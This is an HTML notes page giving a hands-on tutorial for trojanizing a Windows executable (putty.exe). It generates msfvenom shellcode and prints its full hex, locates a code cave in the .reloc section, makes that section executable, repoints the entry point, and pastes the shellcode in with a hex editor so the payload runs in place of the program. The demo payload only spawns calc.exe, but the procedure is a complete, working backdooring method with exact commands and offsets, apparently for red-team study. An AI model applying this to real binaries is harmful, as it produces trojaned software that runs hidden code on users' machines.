<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Manually</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Infecting PE Files - Find code cave -&gt; inject into section - Manual</h1></strong><br />The PE file I&#39;m using as my dummy program in this demo is <code>putty.exe</code><br /><br /><strong><h3>Overview</h3></strong><br />1. Prepare shellcode<br />2. Find code cave<br />3. Open in CFF Explorer<br />   1) Set section where code cave resides as read/write/execute<br />   2) Calculate address of entry point<br />      - Code Cave Section&#39;s VirtualAddress + offset to code cave<br />   3) Change AddressOfEntry point <br />5. Open in HxD<br />   5) Write shellcode into code cave -&gt; save<br /><br /><strong>Software:</strong><br />• Tool to find code cave<br />   ◇ <a href="https://github.com/Antonin-Deniau/cave_miner">https://github.com/Antonin-Deniau/cave_miner</a> - never used before<br />   ◇ <a href="https://github.com/axcheron/pycave">https://github.com/axcheron/pycave</a> - never used before<br />• HxD<br />• CFF Explorer<br /><br /><strong><h2>1. Prepare shellcode</h2></strong><br />Bad bytes on Windows are always: <code>0x00 0x0a 0xad</code><br /><br /><strong><h3>1a) Generate shellcode</h3></strong><br />To get shellcode as raw bytes, pipe to <code>xxd</code>:<br /><code>msfvenom ... | xxd -p</code><br />Or if you want the ASCII and addresses too, pipe to <code>hexdump -C</code>:<br /><code>msfvenom ... | hexdump -C</code><br /><br />The shellcode I&#39;ve generated here spawns <code>calc.exe</code>:<br /><div class="codebox"><div class="codebox">┌─[horace@parrot]─[~]<br />└──╼&nbsp;$msfvenom&nbsp;-p&nbsp;windows/exec&nbsp;cmd=calc.exe&nbsp;-b&nbsp;&#39;0x00&nbsp;0x0a&nbsp;0xad&#39;&nbsp;|&nbsp;xxd&nbsp;-p<br />[...]<br />Payload&nbsp;size:&nbsp;220&nbsp;bytes<br /><br />be9ddef3d0d9ecd97424f4582bc9b13131701383e8fc0370923c062c4442<br />e9cd94236328a56317389553536c191f3185aa6d9eaa1bdbf8859c703887<br />1e8b6d671f44606658b9893a31b53cab3683fc40040585b5dc24a46b577f<br />668db40b2f95d936f92e29ccf8e6602d56c74ddca60f693fdd798ac2e6bd<br />f118622651ead482603f82416ef4c00e720b04258e80abea07d28f2e4c80<br />ae772867ce6893d86ae2390c07a957d395d715d3a5d709bc945cc6bb28b7<br />a334639a85dc2a4e9480cca4dabc4e4da23a4e24a707c8d4d518bdda4a18<br />94b80d8a7411a82a1e6d</div></div><br /><br /><strong><h3>1b) Modify</h3></strong><br />Add <code>0x60 0x9c</code> to the start of your shellcode.<br /><br />These are the <code>pushad</code> and <code>pushaf</code> instructions.<br /><code>0x60</code> - <code>pushad</code> - push all general purpose registers to stack<br /><code>0x9c</code> - <code>pushfd</code> - push EFLAGS to stack<br /><br />Shellcode doesn&#39;t seem to execute properly without them.<br /><br />Final shellcode:<br /><div class="codebox"><div class="codebox">609cbe9ddef3d0d9ecd97424f4582bc9b13131701383e8fc0370923c062c4442<br />e9cd94236328a56317389553536c191f3185aa6d9eaa1bdbf8859c703887<br />1e8b6d671f44606658b9893a31b53cab3683fc40040585b5dc24a46b577f<br />668db40b2f95d936f92e29ccf8e6602d56c74ddca60f693fdd798ac2e6bd<br />f118622651ead482603f82416ef4c00e720b04258e80abea07d28f2e4c80<br />ae772867ce6893d86ae2390c07a957d395d715d3a5d709bc945cc6bb28b7<br />a334639a85dc2a4e9480cca4dabc4e4da23a4e24a707c8d4d518bdda4a18<br />94b80d8a7411a82a1e6d</div></div><br /><br /><strong><h3>1c) Calculate shellcode size</h3></strong><br />Grab the size of the shellcode in both decimal and hex values.<br />We will need them later.<br /><a href="https://www.rapidtables.com/convert/number/decimal-to-hex.html?x=222">https://www.rapidtables.com/convert/number/decimal-to-hex.html</a><br /><br />Above shellcode size:<br />• Decimal - <code>222</code><br />• Hex - <code>DE</code><br /><br /><strong><h2>2. Find code cave</h2></strong><br />Next, you need to find a code cave to store your shellcode.<br />You can use a tool to find one (referenced above) or manually search through the file in HxD.<br /><br />My dummy file is <code>putty.exe</code><br />In my case, I know that there&#39;s a code cave at <code>00107b20</code> in the <code>.reloc</code> section.<br /><a href=""><img src="images/1854-1.png" alt="images/1854-1.png" /></a><br /><br /><strong><h2>3. Edit in CFF Explorer</h2></strong><br />In CFF Explorer we need to:<br />• set the section where our code resides - <code>.reloc</code> - to read/write/execute<br />• modify the AddressOfEntryPoint to the start of our code cave/shellcode<br /><br /><strong><h3>3a) Change section to read/write/execute</h3></strong><br /><code>Section Headers &gt; Find target section &gt; Right click &gt; Change Section Flags</code><br /><a href=""><img src="images/1854-2.png" alt="images/1854-2.png" /></a><br /><br />Tick <code>executable</code>, <code>readable</code>, and <code>writeable</code>.<br /><a href=""><img src="images/1854-3.png" alt="images/1854-3.png" /></a><br /><br /><strong><h3>3b) Calculate AddressOfEntryPoint</h3></strong><br />Navigate to <code>Section Headers</code> and check the values of the section where your code cave resides.<br /><br />My target section is <code>.reloc</code><br /><a href=""><img src="images/1854-4.png" alt="images/1854-4.png" /></a><br /><br />The <code>RawAddress</code> (base address) of this .reloc section on disk is: <code>0x00100a00</code><br />The base address of the code cave on disk is: <code>0x00107b20</code><br />(we know this from your code-cave-finding tool or HxD)<br /><br />To calculate the offset to the code cave, do:<br /><code>Code Cave Address</code> - <code>RawAddress of Section</code> = <code>Offset to Code Cave</code><br /><code>0x00107b20</code>               - <code>0x00100a00</code>                       = <code>0x7120</code><br /><br />We can now use this offset to calculate the start address of our code cave/shellcode once the program has been loaded into memory. <br />Do:<br /><code>section&#39;s VirtualAddress</code> + <code>Offset to Code Cave</code> = <code>Offset of Code Cave from ImageBase</code><br /><code>0x00109000</code>                             + <code>0x00007120</code>                   = <code>0x00110120</code><br /><br />Great!<br /><code>0x00110120</code> is the offset to our code cave from the ImageBase (0x00400000), and our entry point!<br /><br /><strong><h3>3c) Change entry point</h3></strong><br />Navigate to <code>Optional Header &gt; AddressOfEntryPoint</code> and change the value.<br />If the value is correct, the entry point will now read the section where our code cave resides.<br /><a href=""><img src="images/1854-5.png" alt="images/1854-5.png" /></a><br /><br /><strong><h3>3d) Save</h3></strong><br />You&#39;re done editing the file in CFF Explorer.<br />Save!<br />Overwriting is fine.<br /><a href=""><img src="images/1854-6.png" alt="images/1854-6.png" /></a><br /><br /><strong><h2>4. HxD - Write shellcode into code cave</h2></strong><br />Now we can inject our shellcode.<br /><br />Open your modified PE file in <code>HxD</code>, a hex editor.<br />Press <code>Ctrl+G</code> for <code>Go to</code>, and input the address of your code cave.<br />In my case that&#39;s <code>00107b20</code><br /><br />Now we&#39;re at the start of our code cave.<br />Our shellcode size is <code>DE</code> (222 bytes), so highilght <code>DE</code> bytes and copy/paste your shellcode in<br /><a href=""><img src="images/1854-7.png" alt="images/1854-7.png" /></a><br /><br />Save the file, and you&#39;re done.<br /><br /><strong><h2>5. Test</h2></strong><br />We&#39;re done!<br />We&#39;ve injected shellcode into a code cave, modified the section where our code cave resides to read/write/executable, and changed the entry point of the program to our code cave/shellcode.<br />Our dummy file should now execute our shellcode instead of the legitimate program.<br /><br />Here <code>calc.exe</code> runs intead of <code>putty</code>:<br /><a href=""><img src="images/1854-8.png" alt="images/1854-8.png" /></a><br /><br /></div>
</body>
</html>
